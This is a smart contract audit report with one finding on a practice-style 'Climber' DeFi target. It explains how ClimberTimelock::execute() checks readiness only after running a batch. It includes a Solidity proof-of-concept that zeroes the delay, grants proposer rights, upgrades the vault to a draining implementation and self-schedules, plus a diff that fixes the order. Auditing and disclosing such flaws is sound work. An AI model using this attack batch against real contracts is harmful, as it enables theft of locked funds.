---
title: Climber Audit Report
author: Jack
date: January 16, 2026
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---


Prepared by: [Jack](https://github.com/Jack-OuCJ)

# Table of Contents
- [Severity Classification](#severity-classification)
- [Summary](#summary)
- [Findings](#findings)
  - [High](#high)

# Severity Classification

| Severity         | Description |
| ---------------- | ----------- |
| ![high]          | A **directly** exploitable security vulnerability that leads to stolen/lost/locked/compromised assets or catastrophic denial of service. |
| ![medium]        | Assets not at direct risk, but the function of the protocol or its availability could be impacted. |
| ![low]           | A violation of common best practices or incorrect usage of primitives, which may not currently have a major impact on security. |
| ![informational] | Non-critical comments, recommendations or potential optimizations, not relevant to security. |

# Summary

| Severity         | Number of issues found |
| ---------------- | ---------------------- |
| ![high]          | 1                      |
| ![medium]        | 0                      |
| ![low]           | 0                      |
| ![informational] | 0                      |
| Total            | 1                      |

# Findings

## High

### [H-1] `ClimberTimelock::execute()` validates operation readiness after execution, allowing self-modification to bypass the timelock delay entirely

**Description:** `ClimberTimelock::execute()` processes the provided call batch **first** and only checks whether the corresponding operation ID is in a `ReadyForExecution` state **afterwards**:

```solidity
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    bytes32 id = getOperationId(targets, values, dataElements, salt);

    // ⚠️ Step 1: Execute all calls (no state check yet)
    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

    // ⚠️ Step 2: Check readiness AFTER execution
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }
    operations[id].executed = true;
}
```

The timelock holds `ADMIN_ROLE` over itself (via `AccessControl`), so any call batch executed in step 1 can include self-modifying operations:
- `timelock.updateDelay(0)` — reduces the scheduling delay to zero
- `timelock.grantRole(PROPOSER_ROLE, attacker)` — grants proposal rights to the attacker

With delay set to 0 and proposer rights acquired inside the execution loop, an attacker can add a final call in the batch that schedules the exact same batch immediately. The operation ID becomes `ReadyForExecution` (delay=0, scheduled just now), and the post-execution check passes.

Since `ClimberTimelock` is the owner of `ClimberVault` (a UUPS upgradeable contract), the attacker can include a vault upgrade step in the same batch, replacing the implementation with a malicious contract that drains all funds.

**Impact:** An attacker can bypass the 1-hour timelock delay entirely, seize full administrative control of `ClimberTimelock`, upgrade `ClimberVault` to a malicious implementation, and drain all 10,000,000 DVT from the vault — all in a single transaction.

**Proof of Concept:**

```solidity
// Build the self-referential execute batch:

// Call 1: Set delay to 0
targets[0] = address(timelock);
data[0] = abi.encodeCall(ClimberTimelock.updateDelay, (uint64(0)));

// Call 2: Grant attacker PROPOSER_ROLE
targets[1] = address(timelock);
data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(scheduler));

// Call 3: Upgrade vault + drain funds
targets[2] = address(vault);
data[2] = abi.encodeWithSignature(
    "upgradeToAndCall(address,bytes)",
    address(maliciousImpl),
    abi.encodeCall(MaliciousVault.drain, (recovery))
);

// Call 4: Schedule this exact batch (with delay=0, it becomes immediately ready)
targets[3] = address(scheduler); // scheduler holds the parameters for self-referential schedule
data[3] = abi.encodeCall(ClimberScheduler.schedule, ());

// Execute: first 3 calls run, then scheduler.schedule() makes the op id ready,
// post-execution check passes → 10M DVT drained
timelock.execute(targets, values, data, salt);
```

**Recommended Mitigation:**

Reverse the check-execute order: validate operation readiness **before** executing any calls:

```diff
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
    bytes32 id = getOperationId(targets, values, dataElements, salt);

+   // Step 1: Validate BEFORE executing
+   if (getOperationState(id) != OperationState.ReadyForExecution) {
+       revert NotReadyForExecution(id);
+   }
+   operations[id].executed = true;

    for (uint8 i = 0; i < targets.length; ++i) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
    }

-   if (getOperationState(id) != OperationState.ReadyForExecution) {
-       revert NotReadyForExecution(id);
-   }
-   operations[id].executed = true;
}
```

Additionally, consider restricting self-modification capabilities: `updateDelay` and `grantRole` on the timelock itself should require a separate governance level or an additional delay layer that cannot be bypassed through the execution batch.

[high]: https://img.shields.io/badge/-High-red "High"
[medium]: https://img.shields.io/badge/-Medium-orange "Medium"
[low]: https://img.shields.io/badge/-Low-yellow "Low"
[informational]: https://img.shields.io/badge/-Informational-blue "Informational"
